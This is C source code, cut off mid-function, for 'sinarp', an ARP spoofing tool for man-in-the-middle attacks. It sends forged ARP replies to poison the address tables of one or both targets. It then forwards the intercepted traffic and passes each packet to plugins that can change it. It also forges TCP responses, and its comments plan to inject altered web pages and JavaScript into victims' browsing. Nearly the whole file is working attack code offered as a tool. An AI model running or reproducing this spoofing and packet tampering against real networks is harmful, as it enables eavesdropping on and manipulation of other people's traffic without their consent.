/*
sinarp ARP 中间人欺骗工具
单向 双向欺骗
加载插件
可以篡改数据包
基于 zxarps  ettercap 的代码
可以在 windows 和 linux 下编译

双向欺骗：
A<--->M<--->B
单向欺骗
A --->M---->B

sinarp 插件的接口

plugin_init();  //加载插件
plugin_process_packet(); //处理数据包
plugin_unload(); //卸载插件

只关注一个C段

最好设置下 让 pcap 不捕获 自己发出去的包

ether src not $YOUR_MAC_ADDRESS

经过几天的奋战  终于整的差不多了

回去把 ARP 欺骗要用到的 Js 写好

然后移植到Linux下 ~~~


// ip 欺骗
*/
#include "sinarp.h"
#ifdef WIN32
#pragma comment(lib,"ws2_32")
#pragma comment(lib,"Iphlpapi.lib")
#endif


//----------  global var
char *g_sinarp_version = "sinarp V2.1";
pcap_t *g_adhandle = NULL;  // 网卡句柄
char g_opened_if_name[256] = {0};//打卡的网卡名称 因为有时候插件需要知道 打开的是哪块网卡 。。所以要把这个导出
uint32 g_interval = 3000;//3 s 欺骗一次
spoof_type g_spoof_type = SPOOF_AB; //默认是双向欺骗
Host  g_HostList[256]; //注意要全部初始化为 0
uint32 g_my_ip = 0;  // 自己的 ip 也就是中间人的 ip
uint8  g_my_mac[6] = {0}; //自己的 mac 也就是中间人的 mac
uint32 g_my_netmask = 0; //子网掩码
uint32 g_my_boardcast_addr = 0; //广播地址
uint32   g_my_gw_addr;//网关的地址
uint8   g_my_gw_mac[6] = {0xFF}; //网关的 mac 地址
uint8   g_broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; //局域网用于广播的 MAC 地址
uint8   g_zero_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
volatile uint32 g_is_capture_thread_active = 0;// ==0 线程非活动的
volatile uint32 g_is_spoof_thread_active = 0;
volatile uint32 g_is_time_shutdown = 0;//那两个线程是不是需要关闭
volatile int64_t g_packet_count = 0;//数据包计数
volatile uint32 g_auto_ip_forward = 1;//默认开启转发
plugin_list g_plugin_list = {0};

void  ( * pf_pcap_perror)(pcap_t *p, char *prefix);
int  ( * pf_pcap_sendpacket)(pcap_t *p, u_char   *buf, int size);
int ( * pf_pcap_next_ex)(pcap_t *p, struct pcap_pkthdr **pkt_header, const u_char **pkt_data);
void ( * pf_pcap_freealldevs)( pcap_if_t   *alldevsp );
void ( * pf_pcap_close)(pcap_t *p);
void ( * pf_pcap_breakloop)(pcap_t * );
int ( * pf_pcap_loop)(pcap_t *, int, pcap_handler, u_char *);
pcap_t *( * pf_pcap_open_live)(const char *device,
                               int      snaplen,
                               int      promisc,
                               int      to_ms,
                               char    *ebuf);
int ( * pf_pcap_findalldevs)(pcap_if_t **, char *);
int ( *pf_pcap_compile)(pcap_t *, struct bpf_program *, const char *, int, bpf_u_int32);
int ( *pf_pcap_setfilter)(pcap_t *, struct bpf_program *);


void DBG_MSG(const char *fmt, ...)
{
#ifdef DEBUG
    va_list args;
    int n;
    char TempBuf[8192];
    va_start(args, fmt);
    n = vsprintf(TempBuf, fmt, args);
    printf("%s", TempBuf);
    va_end(args);
#endif
}

#ifdef WIN32
#else
void Sleep(uint32 msec)
{
    struct timespec slptm;
    slptm.tv_sec = msec / 1000;
    slptm.tv_nsec = 1000 * 1000 * (msec - (msec / 1000) * 1000);      //1000 ns = 1 us
    if (nanosleep(&slptm, NULL) != -1)
    {

    }
    else
    {
        DBG_MSG("%s : %u", "nanosleep failed !!\n", msec);
    }
}
#endif

BOOL  sinarp_load_plugin(const char *szPluginName)
{
    plugin_info plugin = {0};
    plugin_info *ptemp_list;
#ifdef WIN32
    HMODULE hdll = LoadLibraryA(szPluginName);
    if (hdll == NULL)
    {
        DBG_MSG("load library failed   %u !!\n", GetLastError());
        return FALSE;
    }
    plugin.process_packet = (BOOL ( *)(ETHeader *, uint32)) GetProcAddress(hdll, "process_packet");
    plugin.plugin_init = (BOOL ( *)())GetProcAddress(hdll, "plugin_init");
    plugin.plugin_unload = (void * ( *)())GetProcAddress(hdll, "plugin_unload");
#else
    void *hdll = dlopen(szPluginName, RTLD_LAZY);
    if (hdll == NULL)
    {
        DBG_MSG("load library failed   %s !!\n", strerror(errno));
        return FALSE;
    }
    plugin.process_packet = (BOOL ( *)(ETHeader *, uint32)) dlsym(hdll, "process_packet");
    plugin.plugin_init = (BOOL ( *)())dlsym(hdll, "plugin_init");
    plugin.plugin_unload = (void * ( *)())dlsym(hdll, "plugin_unload");
#endif
    if (plugin.process_packet == NULL || NULL == plugin.plugin_init || NULL == plugin.plugin_unload)
    {
        return FALSE;
    }

    if (FALSE == plugin.plugin_init())
    {
        return FALSE;
    }

    plugin.name = strdup(szPluginName);

    //插到插件列表里面
    if (g_plugin_list.plugin == NULL)
    {
        ptemp_list = (plugin_info *)malloc(sizeof(plugin_info));
        g_plugin_list.plugin = ptemp_list;
        ++g_plugin_list.count;
    }
    else
    {
        ptemp_list = (plugin_info *)malloc((g_plugin_list.count + 1) * sizeof(plugin_info));
        memcpy(ptemp_list, g_plugin_list.plugin, g_plugin_list.count * sizeof(plugin_info));
        free(g_plugin_list.plugin);
        g_plugin_list.plugin = ptemp_list;
        ptemp_list = g_plugin_list.plugin + g_plugin_list.count;
        ++g_plugin_list.count;
    }
    memcpy(ptemp_list, &plugin, sizeof(plugin_info));
    return TRUE;
}

BOOL  sinarp_free_plugin_list()
{
    uint32 idx = 0;
    if (g_plugin_list.count == 0)
        return FALSE;
    for (idx  = 0 ; idx < g_plugin_list.count ; idx ++)
    {
        //调用下 卸载的函数
        g_plugin_list.plugin[idx].plugin_unload();

        free((void *)g_plugin_list.plugin[idx].name);
    }
    free(g_plugin_list.plugin);
    ZeroMemory(&g_plugin_list, sizeof(plugin_list));
    return TRUE;
}

const char   *sinarp_take_out_string_by_char(const char *Source, char *Dest, int buflen, char ch)
{
    int i;
    const char *p;
    const char *lpret;
    if (Source == NULL)
        return NULL;

    p = strchr(Source, ch);
    while (*Source == ' ')
        Source++;
    for (i = 0; i < buflen && *(Source + i) && *(Source + i) != ch; i++)
    {
        Dest[i] = *(Source + i);
    }
    if (i == 0)
        return NULL;
    else
        Dest[i] = '\0';

    lpret = p ? p + 1 : Source + i;

    while (Dest[i - 1] == ' ' && i > 0)
        Dest[i-- -1] = '\0';

    return lpret;
}

void  sinarp_inert_hostlist(HostList **pHostList, uint32 ip, uint8 mac[6])
{
    //    msg("%s:%x %x\n",__func__,start_ip,end_ip);
    HostList *pTmp;
    if (!*pHostList)
    {
        *pHostList = (HostList *)malloc(sizeof(HostList));
        (*pHostList)->HostCount = 1;
    }
    else
    {
        pTmp = (HostList *)malloc(((*pHostList)->HostCount + 1) * sizeof(HostList));
        memcpy(pTmp, pHostList, (*pHostList)->HostCount * sizeof(HostList));
        free(*pHostList);
        *pHostList = pTmp;
        ++(*pHostList)->HostCount;
    }
    (*pHostList)[(*pHostList)->HostCount - 1].pHost->ip = ip;
    memcpy((*pHostList)[(*pHostList)->HostCount - 1].pHost->mac, mac, 6);
};

/*
添加了 互斥量 防止多线程打印 混乱
*/

void  sinarp_printf(const char *fmt, ...)
{
    volatile static int cs = 0;
    va_list args;
    int n;
    char TempBuf[8192];
loop:
    while (cs == 1)
        Sleep(1);
    if (cs == 0)
        cs = 1;
    else
        goto loop;
    va_start(args, fmt);
    n = vsprintf(TempBuf, fmt, args);
    printf("%s", TempBuf);
    va_end(args);
    cs = 0;
    fflush(stdout);
    //LeaveCriticalSection(&cs);
}


uint8 *sinarp_load_file_into_mem(const char *file)
{
    FILE *fp;
    long size;
    uint8 *data;

    fp = fopen(file, "r");
    if (fp == NULL)
        return NULL;
    fseek(fp, 0L, SEEK_END);
    size = ftell(fp);
    if (size > 1)
    {
        rewind(fp);
        data = (uint8 *)malloc(ceil(size / 1024.0) * 1024);
        if (data)
        {
            if (fread(data, 1, size, fp))
            {
                return data;
            }
        }
        free(data);
    }
    fclose(fp);
    return NULL;
}

#ifdef WIN32
//-------------------------------

OVERLAPPED      g_ol;
HANDLE g_hrouterevent;
// 启用路由
BOOL sinarp_start_router()
{
    DWORD       dwRet;
    HANDLE      h_err = NULL;

    g_hrouterevent = CreateEvent( NULL, TRUE, FALSE, NULL );
    if ( g_hrouterevent == NULL )
    {
        return FALSE;
    }

    ZeroMemory( (void *)&g_ol, sizeof( g_ol ) );

    g_ol.hEvent = g_hrouterevent;

    dwRet = EnableRouter( &h_err, &g_ol );

    if ( dwRet == ERROR_IO_PENDING ) return TRUE;

    return FALSE;
}

// 关闭路由
BOOL sinarp_close_router()
{
    DWORD       dwRet;
    DWORD       dwEnableCount = 0;

    dwRet = UnenableRouter( &g_ol, &dwEnableCount );

    CloseHandle( g_hrouterevent );

    if ( dwRet == NO_ERROR ) return TRUE;

    return FALSE;
}
#endif

#ifdef WIN32
// 表态绑定ARP函数，操作ARP表
// code from arpspoof,modifyed by shadow
BOOL sinarp_static_arp( unsigned long ul_ip, unsigned char uc_mac[] )
{
    MIB_IPFORWARDROW    ipfrow;
    MIB_IPNETROW        iprow;
    DWORD               dwIPAddr = ul_ip;

    if ( GetBestRoute( dwIPAddr, ADDR_ANY, &ipfrow ) != NO_ERROR )
    {
        return FALSE;
    }

    memset( &iprow, 0, sizeof( iprow ) );
    iprow.dwIndex       = ipfrow.dwForwardIfIndex;
    iprow.dwPhysAddrLen = 6;

    memcpy( iprow.bPhysAddr, uc_mac, 6 );
    iprow.dwAddr = dwIPAddr;
    iprow.dwType = 4;                           // -static

    if ( CreateIpNetEntry( &iprow ) != NO_ERROR )
    {
        return FALSE;
    }

    return TRUE;
}
#endif

// 构造ARP数据报
int  sinarp_build_arp_packet(\
                             ARP_PACKET *arp_packet,
                             uint16 arp_opcode,//要发送的ARP包的类型
                             uint8 src_mac[6],
                             uint8 dst_mac[6],
                             uint8 arp_src_mac[6],
                             uint32 arp_src_ip,
                             uint8 arp_dst_mac[6],
                             uint32 arp_dst_ip)
{
    arp_packet->ethdr.type = htons(ETHERTYPE_ARP);
    arp_packet->arphdr.hrd = htons(ARPHRD_ETHER);
    arp_packet->arphdr.eth_type = htons(ETHERTYPE_IP);
    arp_packet->arphdr.maclen = 6;
    arp_packet->arphdr.iplen = 4;
    arp_packet->arphdr.opcode = htons(arp_opcode);

    memcpy(arp_packet->ethdr.dhost, dst_mac, 6 );       //目的MAC地址。(A的地址）
    memcpy(arp_packet->ethdr.shost, src_mac, 6 );       //源MAC地址

    memcpy(arp_packet->arphdr.smac, arp_src_mac, 6 );       //伪造的C的MAC地址
    arp_packet->arphdr.saddr = arp_src_ip;

    memcpy(arp_packet->arphdr.dmac, arp_dst_mac, 6 );       //目标A的MAC地址
    arp_packet->arphdr.daddr = arp_dst_ip;                  //目标A的IP地址

    return 1;
}

/*
发送ARP数据包获得  dest ip 对应的 MAC  捕获线程里面会得到远程主机回复的消息 得到其MAC地址
*/
BOOL  sinarp_send_arp(uint32 DestIP)
{
    ARP_PACKET arp_packet;
    memset(&arp_packet, 0, sizeof(arp_packet));
    sinarp_build_arp_packet(&arp_packet, ARP_REQUEST, g_my_mac, g_broadcast_mac, g_my_mac, g_my_ip, g_zero_mac, DestIP);
    if (pf_pcap_sendpacket(g_adhandle, (unsigned char *)&arp_packet, ARP_LEN) < 0)
    {
        sinarp_printf("%s", "[!] Forward thread send packet error\n");
        return FALSE;
    }
    return TRUE;
}

/*
告诉 spoof_ip ip 对应的 MAC 是 mac
*/
BOOL  sinarp_arp_spoof(uint32 spoof_ip, uint8 *spoof_mac, uint32 ip, uint8 *mac)
{
    ARP_PACKET arp_packet;
    memset(&arp_packet, 0, sizeof(arp_packet));
    sinarp_build_arp_packet(&arp_packet, ARP_REPLY, mac, spoof_mac, mac, ip, spoof_mac, spoof_ip);
    if (pf_pcap_sendpacket(g_adhandle, (unsigned char *)&arp_packet, ARP_LEN) < 0)
    {
        sinarp_printf("%s", "[!]sinarp_arp_spoof(): send packet error\n");
        return FALSE;
    }
    return TRUE;
}

#ifdef WIN32
BOOL sinarp_init_pcap_funcs()
{
    pf_pcap_perror = (void  ( *)(pcap_t *, char *)) GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_perror");
    pf_pcap_sendpacket = (int  ( * )(pcap_t * , u_char * , int )) GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_sendpacket");
    pf_pcap_next_ex = (int ( *)(pcap_t *, struct pcap_pkthdr **, const u_char **)) GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_next_ex");
    pf_pcap_freealldevs = (void ( *)( pcap_if_t *)) GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_freealldevs");
    pf_pcap_close = (void ( *)(pcap_t *))GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_close");
    pf_pcap_breakloop = (void ( *)(pcap_t *)) GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_breakloop");
    pf_pcap_loop = (int ( *)(pcap_t *, int, pcap_handler, u_char *)) GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_loop");
    pf_pcap_open_live = (pcap_t * ( *)(const char *, int, int, int, char *)) GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_open_live");
    pf_pcap_findalldevs = (int ( *)(pcap_if_t **, char *)) GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_findalldevs");
    pf_pcap_breakloop = (void ( *)(pcap_t *))GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_breakloop");
    pf_pcap_compile = (int ( *)(pcap_t *, struct bpf_program *, const char *, int, bpf_u_int32))GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_compile");
    pf_pcap_setfilter = (int ( *)(pcap_t *, struct bpf_program *)) GetProcAddress(LoadLibraryA("wpcap.dll"), "pcap_setfilter");
    if (!(pf_pcap_perror &&
            pf_pcap_sendpacket &&
            pf_pcap_next_ex &&
            pf_pcap_freealldevs &&
            pf_pcap_close &&
            pf_pcap_breakloop &&
            pf_pcap_open_live &&
            pf_pcap_findalldevs &&
            pf_pcap_breakloop &&
            pf_pcap_compile &&
            pf_pcap_setfilter))
    {
        return FALSE;
    }
    return TRUE;
}
#else // for linux 
BOOL sinarp_init_pcap_funcs()
{
    pf_pcap_perror = (void  ( *)(pcap_t *, char *)) dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_perror");
    pf_pcap_sendpacket = (int  ( * )(pcap_t * , u_char * , int )) dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_sendpacket");
    pf_pcap_next_ex = (int ( *)(pcap_t *, struct pcap_pkthdr **, const u_char **)) dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_next_ex");
    pf_pcap_freealldevs = (void ( *)( pcap_if_t *)) dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_freealldevs");
    pf_pcap_close = (void ( *)(pcap_t *))dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_close");
    pf_pcap_breakloop = (void ( *)(pcap_t *)) dlsym(dlopen("wpcap.dll", RTLD_LAZY), "pcap_breakloop");
    pf_pcap_loop = (int ( *)(pcap_t *, int, pcap_handler, u_char *)) dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_loop");
    pf_pcap_open_live = (pcap_t * ( *)(const char *, int, int, int, char *)) dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_open_live");
    pf_pcap_findalldevs = (int ( *)(pcap_if_t **, char *)) dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_findalldevs");
    pf_pcap_breakloop = (void ( *)(pcap_t *))dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_breakloop");
    pf_pcap_compile = (int ( *)(pcap_t *, struct bpf_program *, const char *, int, bpf_u_int32))dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_compile");
    pf_pcap_setfilter = (int ( *)(pcap_t *, struct bpf_program *)) dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_setfilter");
    if (!(pf_pcap_perror &&
            pf_pcap_sendpacket &&
            pf_pcap_next_ex &&
            pf_pcap_freealldevs &&
            pf_pcap_close &&
            pf_pcap_breakloop &&
            pf_pcap_open_live &&
            pf_pcap_findalldevs &&
            pf_pcap_breakloop &&
            pf_pcap_compile &&
            pf_pcap_setfilter))
    {
        return FALSE;
    }
    return TRUE;
}
#endif

void sinarp_copyright_msg()
{
    sinarp_printf(\
           "%s\n"
           //"基于ARP欺骗的中间人攻击工具\n"
           "By:sincoder\nBlog:www.sincoder.com\nEmail:2bcoder@gmail.com\n",g_sinarp_version);
}

void sinarp_show_help_msg()
{
    sinarp_printf("Usage:sinarp [OPTIONS]\n"
                  "\t-i [network interface id]\n"
                  "\t-A [Target A]\n"
                  "\t-M [Middleman's ip,if the adapter has multiple ip ,you need to specify one]\n"
                  "\t-B [Target B]\n"
                  "\t-s [0|1|2] spoof type 0: A --> M --> B 1:  A <--> M <--> B 2: no arp spoof \n"
                  "\t-p [Name of the plug-ins to be loaded, split multiple plugin use ',']\n"
                  "\t-t [Time between echo spoof packet , in ms, default is 10000ms]\n"
                  "\t-f [Close ip forwarding]\n"
                  "\t--mac [ip1-mac1,ip2-mac2] special the mac of the ip \n");
}
/*
void sinarp_show_help_msg()
{
sinarp_printf("Usage:sinarp [选项]\n"
"\t-i [网卡id]\n"
"\t-A [A类主机列表,默认为网关]\n"
"\t-M [中间人ip,如果网卡上有多个Ip的话就需要指定一个ip，默认使用指定网卡的第一个ip]\n"
"\t-B [B类主机列表]\n"
"\t-s [0|1] 欺骗类型 0:单向欺骗 A --> M --> B 1:双向欺骗  A <--> M <--> B\n"
"\t-p [要加载的插件名称,多个插件之间以',' 分割]\n"
"\t-t [欺骗数据包的间隔时间,单位ms,默认为10000ms]\n");
}
*/
//计算效验和函数，先把IP首部的效验和字段设为0(IP_HEADER.checksum=0)
//然后计算整个IP首部的二进制反码的和。
uint16 checksum(uint16 *buffer, int size)
{
    unsigned long cksum = 0;
    while (size > 1)
    {
        cksum += *buffer++;
        size -= sizeof(uint16);
    }
    if (size) cksum += *(uint8 *) buffer;
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (uint16) (~cksum);
}

unsigned long cksum1(unsigned long cksum, uint16 *buffer, int size)
{
    while (size > 1)
    {
        cksum += *buffer++;
        size -= sizeof(uint16);
    }
    if (size) cksum += *(uint8 *) buffer;

    return (cksum);
}

uint16 cksum2(unsigned long cksum)
{

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (uint16) (~cksum);
}
//
// 计算tcp udp检验和的函数
//
void  sinarp_checksum(IPHeader *pIphdr)
{
    PSD psd;
    u_int i;
    unsigned long   _sum = 0;
    IPHeader  *ih;
    TCPHeader *th;
    UDPHEADER *uh;
    u_int ip_len = 0, pro_len = 0, data_len = 0;
    unsigned char *data_offset;

    // 找到IP头的位置和得到IP头的长度
    ih = pIphdr;
    ip_len = (ih->iphVerLen & 0xf) * sizeof(unsigned long);
    if (ih->ipProtocol == PROTO_TCP)
    {
        // 找到TCP的位置
        th = (TCPHeader *) ((u_char *)ih + ip_len);
        pro_len = ((th->dataoffset >> 4) * sizeof(unsigned long));
        th->checksum = 0;
    }
    else if (ih->ipProtocol == PROTO_UDP)
    {
        // 找到UDP的位置
        uh = (UDPHEADER *) ((u_char *)ih + ip_len);
        pro_len = sizeof(UDPHEADER);
        uh->uh_sum = 0;
    }
    // 数据长度
    data_len = ntohs(ih->ipLength) - (ip_len + pro_len);
    // 数据偏移指针
    data_offset = (unsigned char *)ih + ip_len + pro_len;

    // 伪头
    // 包含源IP地址和目的IP地址
    psd.saddr = ih->ipSource;
    psd.daddr = ih->ipDestination;

    // 包含8位0域

    psd.mbz = 0;

    // 协议
    psd.ptcl = ih->ipProtocol;

    // 长度
    psd.udpl = htons(pro_len + data_len);

    // 补齐到下一个16位边界
    for (i = 0; i < data_len % 2; i++)
    {
        data_offset[data_len] = 0;
        data_len++;
    }
    ih->ipChecksum = 0;
    ih->ipChecksum = checksum((uint16 *)ih, ip_len);
    _sum = cksum1(0, (uint16 *)&psd, sizeof(PSD));
    _sum = cksum1(_sum, (uint16 *)((u_char *)ih + ip_len), pro_len);
    _sum = cksum1(_sum, (uint16 *)data_offset, data_len);
    _sum = cksum2(_sum);

    // 计算这个校验和，将结果填充到协议头
    if (ih->ipProtocol == PROTO_TCP)
        th->checksum = (uint16)_sum;
    else if (ih->ipProtocol == PROTO_UDP)
        uh->uh_sum = (uint16)_sum;
    else
        return;
}

// from NetFuke Source
// 内存匹配函数memfind
// 基于BM算法
// 作者:周霖 KCN
// modified by shadow @2007/03/18
void  *sinarp_memfind( const void      *in_block,       /* 数据块 */
                       const size_t    block_size,     /* 数据块长度 */
                       const void     *in_pattern,     /* 需要查找的数据 */
                       const size_t    pattern_size,   /* 查找数据的长度 */
                       size_t         *shift_table,    /* 移位表，应该是256*size_t的数组 */
                       BOOL            b_init )        /* 是否需要初始化移位表 */
{
    size_t  i4_index    = 0;    // 字节偏移量
    size_t  i4_matchlen = 0;    // 匹配了的长度
    size_t  i4_limit    = 0;    // 可搜索的最大长度

    const unsigned char    *p_match     = NULL;     // 匹配开始指针
    const unsigned char    *p_block     = (unsigned char *) in_block;   // 搜索指针
    const unsigned char    *p_pattern   = (unsigned char *) in_pattern; // 匹配指针

    // 检查
    if ( ( NULL == p_block ) ||
            ( NULL == p_pattern ) ||
            ( block_size < pattern_size ) ||
            ( ( b_init == FALSE ) && ( shift_table == NULL ) ) )

    {
        return NULL;
    }

    // 空串匹配第一个
    if ( 0 >= pattern_size )
    {
        return ( (void *)p_block );
    }

    // 如果没有初始化移位表，构造移位表
    if ( b_init )
    {
        // 申请移位表空间
        shift_table = (size_t *)malloc(256 * sizeof(size_t));

        // 初始化移位偏移量
        for ( i4_index = 0; i4_index < 256; ++i4_index )
        {
            shift_table[i4_index] = pattern_size + 1;
        }

        // 实例化出现字符的偏移量
        for ( i4_index = 0; i4_index < pattern_size; ++i4_index )
        {
            shift_table[(unsigned char)p_pattern[i4_index]] = pattern_size - i4_index;
        }
    }

    // 实际需要搜索的最大长度
    i4_limit = block_size - pattern_size + 1;

    // 开始搜索数据块，每次前进移位表中的数量
    for (    i4_index = 0;
             i4_index < i4_limit;
             i4_index += shift_table[(unsigned char)p_block[i4_index + pattern_size]] )
    {
        // 如果第一个字节匹配，那么继续匹配剩下的
        if ( p_block[i4_index] == *p_pattern )
        {
            p_match     = p_block + i4_index + 1;
            i4_matchlen = 1;

            do
            {
                // 匹配满足
                if ( i4_matchlen == pattern_size )
                {
                    if ( b_init )
                    {
                        free(shift_table);
                    }
                    return (void *)( p_block + i4_index );
                }
            }
            while ( *p_match++ == p_pattern[i4_matchlen++] );
        }
    }

    if ( b_init )
    {
        free(shift_table);
    }

    return NULL;
}

/*
修改网页  返回一个 我们自己修改的包 给请求方 然后把这个真实的包 要不要再发给真实的 服务器呢 今晚回去抓包瞧瞧。。
返回一段 js 来加载真实的网页
*/
/*
返回 TRUE 说明这个包需要被转发出去  FALSE 的话 说明我们自己已经处理这个包了。
*/


/*
由传入的数据包 来建立一个返回包 。
IN ethdr 传入的请求包

*/
BOOL  sinarp_build_tcp_response_packet(ETHeader *ethdr, uint8 *packet, uint32 *psize, uint8 *data, uint32 size)
{
    IPHeader *in_iphdr = NULL;
    ETHeader *my_ethdr = (ETHeader *)packet;
    IPHeader *my_iphdr = NULL;
    TCPHeader *my_tcphdr = NULL;
    TCPHeader *in_tcphdr = NULL;
    uint32 ip_len;
    uint32 in_data_len;
    memcpy(my_ethdr->dhost, ethdr->shost, 6);
    memcpy(my_ethdr->shost, ethdr->dhost, 6);
    my_ethdr->type = ethdr->type;
    my_iphdr = (IPHeader *)((uint8 *)my_ethdr + 14);
    in_iphdr = (IPHeader *)((uint8 *)ethdr + 14);
    //拷贝原 Ip 头 然后改写需要改写的字段
    memcpy(my_iphdr, in_iphdr, sizeof(IPHeader) + sizeof(TCPHeader));
    my_iphdr->ipSource = in_iphdr->ipDestination;
    my_iphdr->ipDestination = in_iphdr->ipSource;
    ip_len = (my_iphdr->iphVerLen & 0xf) * sizeof(unsigned long);
    my_tcphdr = (TCPHeader *) ((u_char *)my_iphdr + ip_len);
    in_tcphdr = (TCPHeader *)((u_char *)in_iphdr + ip_len);
    my_iphdr->ipLength = htons(ip_len + ((my_tcphdr->dataoffset >> 4) * sizeof(unsigned long)) + size);
    in_data_len = ntohs(in_iphdr->ipLength) - (ip_len + ((my_tcphdr->dataoffset >> 4) * sizeof(unsigned long))); //接收到的数据长度
    my_tcphdr->acknowledgeNumber = htonl(ntohl(in_tcphdr->sequenceNumber) + in_data_len);
    my_tcphdr->sequenceNumber = in_tcphdr->acknowledgeNumber;
    my_tcphdr->sourcePort = in_tcphdr->destinationPort;
    my_tcphdr->destinationPort = in_tcphdr->sourcePort;
    my_tcphdr->flags = 0x08 | 0x10 | 0x01; // PSH + ACK + FIN 发出断开连接的标识 因为后续的和真实主机的通信 必然会发送TCP序列出错
    memcpy((uint8 *)my_iphdr + ip_len + ((my_tcphdr->dataoffset >> 4)*sizeof(unsigned long)), data, size);
    sinarp_checksum(my_iphdr);
    *psize = 14 + ntohs(my_iphdr->ipLength);
    return TRUE;
}

char *sinarp_get_mac_by_ip(uint32 ip)
{
    if (1 == g_HostList[ip >> 24].active)
    {
        return (char *)&g_HostList[ip >> 24].mac[0];
    }
    return NULL;
}

//修正包的mac地址 用于转发
void  sinarp_forward_fix_packet(ETHeader *packet)
{
    IPHeader *ih = (IPHeader *) ((u_char *)packet + 14); //14为以太头的长度
    /*
    修改了数据包 必须保证包还是正确的
    */
    // 转发数据包
    memcpy(packet->shost, packet->dhost, 6); //要更改源地址为 中间人的地址 不然 会重复捕获到包 ……
    /*
    根据目的地址来得到 mac 的方式不可靠  因为目的地址可能是外网的 此时我们要发给网关
    数据包转发相关：
    IP 包中 的 目标和 源 IP 如果两个都是内网的 那么说明是内网中的两台主机通讯 此时直接由 ip 得到对应的 mac 地址就行了。
    如果其中一个不是的内网的 说明是内网和外网之间通讯的 那么网关参与其中了 此时由内网的 ip 可以得到其 mac 地址
    内网发送到外网 源 ip 地址是内网的 目标是外网的 那么 替换 目标MAC地址为网关的 源MAC为自己的 源ip也为自己的
    外网发送到内网 源 ip 是外网的 目标是内网的 替换目标 mac 为ip的mac 源MAC 为自己
    2个ip 都是外网的 这种情况 不可能
    */
    if (((g_my_ip & 0x00FFFFFF) ^ (ih->ipDestination & 0x00FFFFFF)) == 0)
    {
        //如果目标 ip 在内网
        memcpy(packet->dhost, g_HostList[ih->ipDestination >> 24].mac, 6); //替换目标 mac 为正确的 mac
    }
    else
    {
        // 目标是外网的 那么源ip肯定在内网了
        memcpy(packet->dhost, g_HostList[g_my_gw_addr >> 24].mac, 6); //替换目标 mac 为网关的 mac
    }
}

void   sinarp_packet_handler(u_char *param, const struct pcap_pkthdr *header,
                             const u_char *pkt_data)
{
    ETHeader *eh;
    IPHeader *ih;
    ARPHeader *arp_hdr;
    //BOOL bRet = FALSE;
    //u_int ip_len = 0, pro_len = 0, data_len = 0;
    u_int pkt_len = header->len;
    uint32 idx = 0;
    eh = (ETHeader *) pkt_data;
    if (pkt_len < 14)
        return;
    ++g_packet_count;
    if (eh->type == htons(ETHERTYPE_ARP))
    {
        //是个 ARP 包  那么看看是不是ARP回复包。。
        arp_hdr = (ARPHeader *)((uint8 *)eh + 14);
        if (arp_hdr->opcode == htons(ARP_REPLY)) //ARP 回复包
        {
            //发送者的 IP 和 MAC　就是要告诉我们的　IP　和　MAC对应关系
            DBG_MSG("ARP tel: %s --> %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n", sinarp_iptos(arp_hdr->saddr), \
                    arp_hdr->smac[0], arp_hdr->smac[1], arp_hdr->smac[2], arp_hdr->smac[3], arp_hdr->smac[4], arp_hdr->smac[5]);
            //看看这个 ip 是不是在我们的 C 段里面
            if (((g_my_ip & 0x00FFFFFF) - (arp_hdr->saddr & 0x00FFFFFF)) == 0 &&
                    g_HostList[arp_hdr->saddr >> 24].active == 0)
            {
                DBG_MSG("add mac entry ... \n");
                //设置这个 ip 在 ip 表里面对应的 MAC
                memcpy(g_HostList[arp_hdr->saddr >> 24].mac, arp_hdr->smac, 6);
                g_HostList[arp_hdr->saddr >> 24].active = 1;
            }
        }
    }
    if (g_auto_ip_forward == 1)
    {
        //转发 ip 数据包。。
        if (eh->type != htons(ETHERTYPE_IP))
            return; // 只转发IP包

        // 找到IP头的位置和得到IP头的长度
        ih = (IPHeader *) ((u_char *)eh + 14); //14为以太头的长度
        /*
        判断 我们要不要转发 数据包
        先判断 包是不是发给自己的 (判断 ip 头里的 目标 ip 是不是我们的ip)
        然后 从主机列表里面 查找 ip 对应的 mac 如果是活动的主机 那么取出其 mac 并替换 接收到的数据包的 目标 mac 并发送出去
        使用 pcap_sendpacket 发出去的包 也会被 pcap 捕获到
        */
        /*
        如果 包的目标地址是我的 mac 但是 目标 ip 不是我的 ip 那么这个包就是我要转发的  作为中间人 我们有责任转发 ~~
        */
        if ((ih->ipDestination !=  g_my_ip) && (memcmp(g_my_mac, eh->dhost, 6) == 0))
        {
            // 调用插件来处理数据包（包修改器）
            if (g_plugin_list.count > 0)
            {
                //依次获得每个插件的 数据包处理指针 来处理数据包
                for (idx  = 0 ; idx < g_plugin_list.count; idx ++)
                {
                    if (g_plugin_list.plugin[idx].process_packet(eh, pkt_len) == FALSE)
                        return;
                }
            }

            sinarp_forward_fix_packet(eh);
            //DBG_MSG("send packet to %s \n",sinarp_iptos(ih->ipDestination));
            if (pf_pcap_sendpacket(g_adhandle, (unsigned char *) pkt_data, pkt_len) < 0)
            {
                printf("\r[!] Forward thread send packet error\r\n");
            }
        }
    }
    return;
}

void sinarp_do_capture()
{
    int ret;
